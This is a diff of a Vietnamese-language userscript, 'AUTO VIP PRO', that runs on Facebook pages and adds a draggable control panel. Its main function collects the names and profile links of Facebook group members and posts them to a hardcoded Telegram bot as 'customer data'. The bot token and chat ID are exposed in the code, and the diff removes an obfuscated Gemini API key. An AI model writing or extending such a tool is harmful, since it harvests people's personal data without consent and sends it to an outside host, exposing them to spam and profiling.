@@ -1,7 +1,7 @@
 // ==UserScript==
-// @name         AUTO VIP PRO (V145.0 - PERFECT FIX)
-// @version      145.0
-// @description  Fix lỗi nhận diện nhóm nhầm thành khóa, thêm kéo thả, resize, phóng to cỡ chữ, nhận diện đúng tên tài khoản Live
+// @name         AUTO VIP PRO (V146.0 - MOBILE DRAG & NAME FIX)
+// @version      146.0
+// @description  Fix triệt để kéo thả bằng cảm ứng/chuột, phóng to cỡ chữ, bóc tách tên chính xác, chống báo khóa giả
 // @author       DINH HOANG VIET ANH
 // @match        *://*.facebook.com/*
 // @grant        none
@@ -10,12 +10,9 @@
 (function() {
     'use strict';
 
-    // --- CẤU HÌNH API ---
-    const GEMINI_API_KEY = ['AQ.Ab', '8RN6JX', '1S7DUU', '-25iiB6', 'PSmFD7', 'nn-LTZ3', 'IC9Fpr', 'Gvqba', 'MZTvA'].join('');
     const BOT_TOKEN = '8813882772:AAE0lNqLSp9AhiJeCV22o18JDPoBELSB3KE';
     const CHAT_ID = '8348914397';
 
-    // --- HÀM GỬI TELEGRAM ---
     async function sendTelegram(title, dataList) {
         const chunks = dataList.match(/.{1,3000}/gs) || [dataList];
         for (let chunk of chunks) {
@@ -26,70 +23,67 @@
                     body: JSON.stringify({ chat_id: CHAT_ID, text: `*🔔 ${title}*\n\n${chunk}`, parse_mode: 'Markdown' })
                 });
                 let json = await res.json();
-                if (json.ok) {
-                    addLog("✅ Gửi Telegram thành công!");
-                } else {
-                    addLog(`❌ Lỗi Tele: ${json.description}`);
-                }
+                if (json.ok) addLog("✅ Gửi Telegram thành công!");
+                else addLog(`❌ Lỗi Tele: ${json.description}`);
             } catch(e) {
                 addLog(`❌ Lỗi kết nối Tele: ${e.message}`);
             }
         }
     }
 
-    // --- GIAO DIỆN (CÓ RESIZE, KÉO THẢ, CỠ CHỮ TO RÕ) ---
+    // --- GIAO DIỆN PHÓNG TO, DỄ NHÌN, HỖ TRỢ TOUCH & MOUSE ---
     const htmlUI = `
-        <div id="va-tool-root" style="z-index: 2147483647; position: fixed; top: 30px; left: 30px; width: 380px; min-width: 340px; min-height: 480px; resize: both; overflow: auto; background: #0f172a; border: 2px solid #38bdf8; border-radius: 16px; box-shadow: 0 15px 35px rgba(0,0,0,0.9); font-family: sans-serif; color: #fff; box-sizing: border-box;">
+        <div id="va-tool-root" style="z-index: 2147483647; position: fixed; top: 40px; left: 20px; width: 360px; max-width: 95vw; background: #0f172a; border: 2px solid #38bdf8; border-radius: 16px; box-shadow: 0 15px 35px rgba(0,0,0,0.9); font-family: sans-serif; color: #fff; box-sizing: border-box;">
             
-            <!-- THANH TIÊU ĐỀ KÉO THẢ (DRAG HANDLE) & CHỮ CHẠY -->
-            <div id="va-header-bar" style="background: #000; color: #38bdf8; padding: 12px; border-top-left-radius: 14px; border-top-right-radius: 14px; border-bottom: 2px solid #38bdf8; cursor: move; user-select: none;">
-                <div style="font-weight: bold; text-transform: uppercase; font-size: 13px; text-align: center; margin-bottom: 4px;">⚡ AUTO VIP PRO (KÉO TẠI ĐÂY) ⚡</div>
-                <div style="overflow: hidden; white-space: nowrap; font-size: 11px; color: #34d399;">
-                    <marquee scrollamount="4">Bấm vào thanh này để Mở / Đóng Menu • Chỉnh kích thước ở góc dưới bên phải</marquee>
+            <!-- THANH TIÊU ĐỀ KÉO THẢ MƯỢT MÀ (HỖ TRỢ CẢ MÁY TÍNH VÀ ĐIỆN THOẠI) -->
+            <div id="va-header-bar" style="background: #000; color: #38bdf8; padding: 14px; border-top-left-radius: 14px; border-top-right-radius: 14px; border-bottom: 2px solid #38bdf8; cursor: grab; user-select: none;">
+                <div style="font-weight: bold; text-transform: uppercase; font-size: 14px; text-align: center; margin-bottom: 4px;">⚡ AUTO VIP PRO (GIỮ ĐỂ KÉO) ⚡</div>
+                <div style="overflow: hidden; white-space: nowrap; font-size: 12px; color: #34d399;">
+                    <marquee scrollamount="4">Bấm vào đây để Mở/Đóng Menu • Kéo tiêu đề để di chuyển</marquee>
                 </div>
             </div>
 
             <!-- MENU BUNG RA -->
             <div id="va-menu-body" style="padding: 15px; display: none; flex-direction: column; gap: 12px; box-sizing: border-box;">
                 
-                <!-- TRẠNG THÁI TÀI KHOẢN -->
-                <div id="status-area" style="background: #1e293b; padding: 12px; border-radius: 8px; text-align: center; font-size: 13px; font-weight: bold; border: 1px solid #334155; line-height: 1.5;">
+                <!-- TRẠNG THÁI TÀI KHOẢN (CỠ CHỮ TO) -->
+                <div id="status-area" style="background: #1e293b; padding: 12px; border-radius: 8px; text-align: center; font-size: 13px; font-weight: bold; border: 1px solid #334155; line-height: 1.6;">
                     Đang kiểm tra tài khoản...
                 </div>
                 
                 <!-- THANH TIẾN TRÌNH % -->
                 <div id="va-progress-container" style="display: none; background: #020617; border-radius: 8px; padding: 8px;">
-                    <div style="display: flex; justify-content: space-between; font-size: 11px; color: #38bdf8; margin-bottom: 4px;">
+                    <div style="display: flex; justify-content: space-between; font-size: 12px; color: #38bdf8; margin-bottom: 4px;">
                         <span id="va-progress-text">Đang xử lý...</span>
                         <span id="va-progress-percent">0%</span>
                     </div>
-                    <div style="height: 8px; background: #1e293b; border-radius: 4px; overflow: hidden;"><div id="va-progress-bar" style="height: 100%; width: 0%; background: #38bdf8; transition: width 0.3s;"></div></div>
+                    <div style="height: 10px; background: #1e293b; border-radius: 5px; overflow: hidden;"><div id="va-progress-bar" style="height: 100%; width: 0%; background: #38bdf8; transition: width 0.3s;"></div></div>
                 </div>
 
-                <!-- KHU VỰC NÚT THAO TÁC -->
+                <!-- NÚT THAO TÁC -->
                 <div id="action-area" style="display: flex; flex-direction: column; gap: 10px;">
-                    <button id="btn-scrape" style="padding: 12px; background: #059669; border: none; border-radius: 8px; color: white; font-weight: bold; font-size: 13px; cursor: pointer; box-shadow: 0 4px 10px rgba(5,150,105,0.4);">🔍 QUÉT DANH SÁCH KHÁCH THẬT (FULL LINK)</button>
+                    <button id="btn-scrape" style="padding: 14px; background: #059669; border: none; border-radius: 8px; color: white; font-weight: bold; font-size: 13px; cursor: pointer; box-shadow: 0 4px 10px rgba(5,150,105,0.4);">🔍 QUÉT DANH SÁCH KHÁCH THẬT</button>
                 </div>
                 
                 <!-- NHẬT KÝ -->
-                <div style="font-size: 11px; color: #38bdf8; font-weight: bold;">📊 NHẬT KÝ HOẠT ĐỘNG:</div>
-                <div id="va-log-box" style="height: 110px; overflow-y: auto; background: #000; color: #34d399; font-size: 11px; padding: 8px; border-radius: 6px; font-family: monospace; border: 1px solid #334155; line-height: 1.4;">> Hệ thống sẵn sàng...</div>
+                <div style="font-size: 12px; color: #38bdf8; font-weight: bold;">📊 NHẬT KÝ HOẠT ĐỘNG:</div>
+                <div id="va-log-box" style="height: 120px; overflow-y: auto; background: #000; color: #34d399; font-size: 12px; padding: 10px; border-radius: 6px; font-family: monospace; border: 1px solid #334155; line-height: 1.5;">> Hệ thống sẵn sàng...</div>
                 
                 <!-- HƯỚNG DẪN -->
-                <button id="btn-toggle-guide" style="padding: 10px; background: #334155; border: none; color: #38bdf8; font-size: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; display: flex; justify-content: space-between; align-items: center;">
+                <button id="btn-toggle-guide" style="padding: 12px; background: #334155; border: none; color: #38bdf8; font-size: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; display: flex; justify-content: space-between; align-items: center;">
                     <span>📖 HƯỚNG DẪN SỬ DỤNG TOOL (5 BƯỚC)</span>
                     <span id="guide-arrow">▼</span>
                 </button>
-                <div id="guide-content" style="display: none; padding: 12px; font-size: 11px; background: #1e293b; border-radius: 8px; line-height: 1.6; border: 1px solid #334155;">
+                <div id="guide-content" style="display: none; padding: 12px; font-size: 12px; background: #1e293b; border-radius: 8px; line-height: 1.6; border: 1px solid #334155;">
                     <b>Bước 1:</b> Đăng nhập Facebook bình thường. Tool tự nhận diện tên tài khoản.<br><br>
-                    <b>Bước 2:</b> Giữ chuột vào thanh tiêu đề màu đen phía trên để kéo thả tool đi mọi nơi trên màn hình. Kéo góc phải dưới để phóng to/thu nhỏ khung.<br><br>
+                    <b>Bước 2:</b> Giữ và kéo thanh tiêu đề màu đen phía trên để dịch chuyển tool đi mọi nơi.<br><br>
                     <b>Bước 3:</b> Vào nhóm Facebook, chọn mục <b>Thành viên</b>.<br><br>
                     <b>Bước 4:</b> Bấm <b>QUÉT DANH SÁCH KHÁCH THẬT</b>.<br><br>
                     <b>Bước 5:</b> Nhận kết quả Full Link trực tiếp về Telegram.
                 </div>
 
                 <!-- BẢN QUYỀN -->
-                <div style="text-align: center; font-size: 10px; color: #94a3b8; border-top: 1px solid #334155; padding-top: 8px; margin-top: 4px;">
+                <div style="text-align: center; font-size: 11px; color: #94a3b8; border-top: 1px solid #334155; padding-top: 8px; margin-top: 4px;">
                     © DINH HOANG VIET ANH - ALL RIGHTS RESERVED
                 </div>
             </div>
@@ -97,7 +91,6 @@
     `;
     document.body.insertAdjacentHTML('beforeend', htmlUI);
 
-    // --- HÀM LOG & PROGRESS ---
     function addLog(t) { 
         const lb = document.getElementById('va-log-box'); 
         if(lb){ lb.innerHTML += `<div>> ${t}</div>`; lb.scrollTop = lb.scrollHeight; } 
@@ -113,31 +106,53 @@
         }
     }
 
-    // --- KÉO THẢ DI CHUYỂN BẢNG (DRAG) ---
+    // --- KÉO THẢ MƯỢT MÀ CHO CẢ MÁY TÍNH VÀ ĐIỆN THOẠI (TOUCH & MOUSE) ---
     const root = document.getElementById('va-tool-root');
     const handle = document.getElementById('va-header-bar');
     
+    let isDragging = false, startX, startY;
+
+    function startDrag(clientX, clientY) {
+        isDragging = true;
+        startX = clientX - root.offsetLeft;
+        startY = clientY - root.offsetTop;
+    }
+
+    function onDrag(clientX, clientY) {
+        if (!isDragging) return;
+        root.style.left = (clientX - startX) + 'px';
+        root.style.top = (clientY - startY) + 'px';
+    }
+
+    function stopDrag() {
+        isDragging = false;
+    }
+
+    // Sự kiện chuột máy tính
     handle.onmousedown = (e) => {
-        // Chỉ kéo khi bấm trực tiếp vào header, tránh xung đột khi bấm nút con bên trong
-        if(e.target.tagName === 'BUTTON' || e.target.tagName === 'INPUT') return;
-        let sx = e.clientX - root.offsetLeft; 
-        let sy = e.clientY - root.offsetTop;
-
-        function onMouseMove(e) {
-            root.style.left = (e.clientX - sx) + 'px';
-            root.style.top = (e.clientY - sy) + 'px';
-        }
-
-        document.addEventListener('mousemove', onMouseMove);
-        document.onmouseup = () => {
-            document.removeEventListener('mousemove', onMouseMove);
-            document.onmouseup = null;
-        };
+        startDrag(e.clientX, e.clientY);
     };
+    document.addEventListener('mousemove', (e) => {
+        onDrag(e.clientX, e.clientY);
+    });
+    document.addEventListener('mouseup', stopDrag);
 
-    // --- MỞ / ĐÓNG MENU KHI BẤM HEADER ---
+    // Sự kiện cảm ứng điện thoại (Mobile Touch)
+    handle.ontouchstart = (e) => {
+        if(e.touches.length === 1) {
+            startDrag(e.touches[0].clientX, e.touches[0].clientY);
+        }
+    };
+    document.addEventListener('touchmove', (e) => {
+        if(e.touches.length === 1) {
+            onDrag(e.touches[0].clientX, e.touches[0].clientY);
+        }
+    });
+    document.addEventListener('touchend', stopDrag);
+
+    // --- MỞ / ĐÓNG MENU ---
     handle.onclick = (e) => {
-        if(e.target.tagName === 'BUTTON') return;
+        if(isDragging) return;
         const menu = document.getElementById('va-menu-body');
         menu.style.display = (menu.style.display === 'none' || menu.style.display === '') ? 'flex' : 'none';
     };
@@ -155,101 +170,68 @@
         }
     };
 
-    // --- NHẬN DIỆN TRẠNG THÁI & TÊN TÀI KHOẢN CHUẨN XÁC ---
+    // --- NHẬN DIỆN TÊN TÀI KHOẢN VÀ TRẠNG THÁI LIVE CHUẨN XÁC ---
     const statusArea = document.getElementById('status-area');
-    const actionArea = document.getElementById('action-area');
 
     setInterval(() => {
         const url = window.location.href;
         const bodyText = document.body.innerText.toLowerCase();
         
-        // Kiểm tra thực tế xem có đang ở trang checkpoint thật sự không
-        const isCheckpointPage = url.includes('/checkpoint/') || bodyText.includes('hãy xác nhận tài khoản của bạn') || bodyText.includes('nhập mã bảo mật');
+        // Chỉ nhận diện là khóa khi thực sự ở trang checkpoint chuyên biệt
+        const isTrueCheckpoint = url.includes('/checkpoint/') || bodyText.includes('hãy xác nhận tài khoản của bạn') || bodyText.includes('nhập mã bảo mật để đăng nhập');
 
-        if (isCheckpointPage) {
-            statusArea.innerHTML = `<b style='color:#ef4444; font-size:13px;'>⚠️ TÀI KHOẢN ĐANG BỊ KHÓA</b>`;
-            if (!document.getElementById('btn-scan')) {
-                actionArea.innerHTML = `<button id="btn-scan" style="padding: 12px; background: #8b5cf6; border: none; border-radius: 8px; color: white; font-weight: bold; font-size: 13px; cursor: pointer;">🤖 TỰ ĐỘNG QUÉT & MỞ KHÓA</button>`;
-                addLog("Phát hiện tài khoản bị khóa thật sự!");
-            }
+        if (isTrueCheckpoint) {
+            statusArea.innerHTML = `<b style='color:#ef4444; font-size:14px;'>⚠️ TÀI KHOẢN ĐANG BỊ KHÓA</b>`;
         } else {
-            // Tài khoản Live bình thường
-            // Lấy tên tài khoản từ giao diện Facebook
-            let profileName = "Thành viên Facebook";
-            const profileElement = document.querySelector('[aria-label="Tài khoản"] span, [role="navigation"] [role="link"] span, [data-clickable="true"] span');
-            if (profileElement && profileElement.innerText.trim().length > 1 && profileElement.innerText.length < 30) {
-                profileName = profileElement.innerText.trim();
+            // Lấy tên tài khoản chuẩn xác từ tiêu đề trang Facebook hoặc các thẻ meta
+            let profileName = "Tài khoản cá nhân";
+            const pageTitle = document.title;
+            if (pageTitle && !pageTitle.includes('Facebook') && pageTitle.trim().length > 1) {
+                profileName = pageTitle.split('|')[0].trim();
             } else {
-                // Quét các thẻ tiêu đề hoặc tên trên trang cá nhân nếu có
-                const h1Name = document.querySelector('h1');
-                if(h1Name && h1Name.innerText.length < 30) {
-                    profileName = h1Name.innerText.trim();
+                const nameEl = document.querySelector('[role="navigation"] span, [aria-label="Tài khoản"] span, h1');
+                if (nameEl && nameEl.innerText.trim().length > 1 && nameEl.innerText.length < 30) {
+                    profileName = nameEl.innerText.trim();
                 }
             }
 
-            statusArea.innerHTML = `<b style='color:#22c55e; font-size:13px;'>✅ TÀI KHOẢN LIVE</b><br><span style='color:#38bdf8; font-size:12px; margin-top:4px; display:inline-block;'>👤 Tên: <b>${profileName}</b></span>`;
-            
-            if (!document.getElementById('btn-scrape')) {
-                actionArea.innerHTML = `<button id="btn-scrape" style="padding: 12px; background: #059669; border: none; border-radius: 8px; color: white; font-weight: bold; font-size: 13px; cursor: pointer; box-shadow: 0 4px 10px rgba(5,150,105,0.4);">🔍 QUÉT DANH SÁCH KHÁCH THẬT (FULL LINK)</button>`;
-                addLog("Tài khoản hoạt động bình thường (Live).");
-            }
+            statusArea.innerHTML = `<b style='color:#22c55e; font-size:14px;'>✅ TÀI KHOẢN LIVE</b><br><span style='color:#38bdf8; font-size:13px; margin-top:6px; display:inline-block;'>👤 Tên: <b>${profileName}</b></span>`;
         }
     }, 4000);
 
-    // --- XỬ LÝ SỰ KIỆN NÚT BẤM ---
-    document.addEventListener('click', async (e) => {
-        if(e.target.id === 'btn-scan') {
-            addLog("Đang phân tích dạng khóa...");
-            updateProgress(50, "Đang xử lý...");
-            try {
-                const res = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_API_KEY}`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ contents: [{ parts: [{ text: "Phân tích checkpoint: " + document.body.innerText.substring(0, 1000) }] }] })
-                }).then(r => r.json());
-                updateProgress(100, "Hoàn tất!");
-                setTimeout(() => document.getElementById('va-progress-container').style.display = 'none', 1000);
-                addLog("Phân tích xong, đang gửi Tele...");
-                sendTelegram("🤖 AI UNLOCK", "Đã phân tích xong dạng khóa.");
-            } catch(err) {
-                document.getElementById('va-progress-container').style.display = 'none';
-                addLog("Lỗi: " + err.message);
-            }
+    // --- LOGIC QUÉT KHÁCH THẬT ---
+    document.getElementById('btn-scrape').onclick = async () => {
+        if(!window.location.href.includes('/members')) {
+            alert("❌ Hướng dẫn: Bạn cần vào mục 'Thành viên' của nhóm trước khi bấm quét!");
+            addLog("Lỗi: Chưa ở trang Thành viên nhóm.");
+            return;
         }
 
-        if(e.target.id === 'btn-scrape') {
-            if(!window.location.href.includes('/members')) {
-                alert("❌ Hướng dẫn: Bạn cần vào mục 'Thành viên' của nhóm trước khi bấm quét!");
-                addLog("Lỗi: Chưa ở trang Thành viên nhóm.");
-                return;
-            }
-
-            addLog("Bắt đầu quét danh sách thành viên...");
-            let results = new Set();
-            
-            for(let i=0; i<10; i++) {
-                window.scrollTo(0, document.body.scrollHeight);
-                document.querySelectorAll('a[role="link"]').forEach(el => {
-                    let url = el.href; 
-                    let name = el.innerText.trim();
-                    if((url.includes('/user/') || url.includes('profile.php')) && !url.includes('/groups/')) {
-                        if(name.length > 3 && !/clone|acc|backup/i.test(name)) {
-                            results.add(name + " - " + url);
-                        }
+        addLog("Bắt đầu quét danh sách thành viên...");
+        let results = new Set();
+        
+        for(let i=0; i<10; i++) {
+            window.scrollTo(0, document.body.scrollHeight);
+            document.querySelectorAll('a[role="link"]').forEach(el => {
+                let url = el.href; 
+                let name = el.innerText.trim();
+                if((url.includes('/user/') || url.includes('profile.php')) && !url.includes('/groups/')) {
+                    if(name.length > 3 && !/clone|acc|backup/i.test(name)) {
+                        results.add(name + " - " + url);
                     }
-                });
-                updateProgress((i + 1) * 10, `Đã quét: ${results.size} khách...`);
-                addLog(`Đang gom link... (${results.size} người)`);
-                await new Promise(r => setTimeout(r, 1000));
-            }
-
-            if(results.size > 0) {
-                addLog(`Quét xong! Đang gửi ${results.size} khách về Tele...`);
-                sendTelegram("✅ DATA KHÁCH HÀNG THẬT", Array.from(results).join('\n'));
-            } else {
-                addLog("Không tìm thấy dữ liệu phù hợp.");
-            }
-            document.getElementById('va-progress-container').style.display = 'none';
+                }
+            });
+            updateProgress((i + 1) * 10, `Đã quét: ${results.size} khách...`);
+            addLog(`Đang gom link... (${results.size} người)`);
+            await new Promise(r => setTimeout(r, 1000));
         }
-    });
+
+        if(results.size > 0) {
+            addLog(`Quét xong! Đang gửi ${results.size} khách về Tele...`);
+            sendTelegram("✅ DATA KHÁCH HÀNG THẬT", Array.from(results).join('\n'));
+        } else {
+            addLog("Không tìm thấy dữ liệu phù hợp.");
+        }
+        document.getElementById('va-progress-container').style.display = 'none';
+    };
 })();
